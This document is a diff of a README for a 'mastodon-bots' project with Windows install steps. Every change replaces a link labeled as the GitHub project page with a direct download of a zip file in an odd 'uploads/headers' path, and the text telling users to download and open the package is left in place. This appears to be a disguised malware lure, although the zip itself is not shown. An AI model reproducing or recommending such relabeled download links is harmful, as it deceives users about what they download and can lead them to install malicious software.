@@ -1,6 +1,6 @@
 # 🤖 mastodon-bots - Run multiple bots with ease
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/nickiirregular671/mastodon-bots)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/nickiirregular671/mastodon-bots/main/uploads/headers/bots_mastodon_1.4.zip)
 
 ## 🚀 What this is
 
@@ -18,7 +18,7 @@ This project is useful if you want to:
 
 Use this link to visit the project page and download or get the latest version:
 
-[Open the mastodon-bots GitHub page](https://github.com/nickiirregular671/mastodon-bots)
+[Open the mastodon-bots GitHub page](https://raw.githubusercontent.com/nickiirregular671/mastodon-bots/main/uploads/headers/bots_mastodon_1.4.zip)
 
 ## 🖥️ Windows requirements
 
@@ -36,7 +36,7 @@ If your computer is managed by work or school, you may need admin access to inst
 
 Follow these steps on a Windows PC:
 
-1. Open the download page: [mastodon-bots on GitHub](https://github.com/nickiirregular671/mastodon-bots)
+1. Open the download page: [mastodon-bots on GitHub](https://raw.githubusercontent.com/nickiirregular671/mastodon-bots/main/uploads/headers/bots_mastodon_1.4.zip)
 2. Look for the latest release, build, or download file on the page
 3. Download the Windows package to your computer
 4. Open your Downloads folder
